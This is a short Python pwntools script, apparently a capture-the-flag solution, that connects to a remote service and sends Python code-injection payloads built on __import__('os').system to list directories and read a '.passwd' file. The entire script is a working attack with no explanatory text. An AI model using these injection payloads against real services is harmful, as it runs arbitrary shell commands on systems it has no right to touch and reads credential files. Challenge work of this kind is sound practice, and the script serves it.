from pwn import *

payloads = [
    "__import__('os').system('ls')",
    "__import__('os').system('ls -la')",
    "__import__('os').system('cat .passwd')"
]

for i in payloads:
    conn = remote('jeuxpythiques.woody.sh',8007)
    data = conn.recv()
    print(data)

    conn.sendline(i.encode())
    conn.recv()
    print(conn.recv())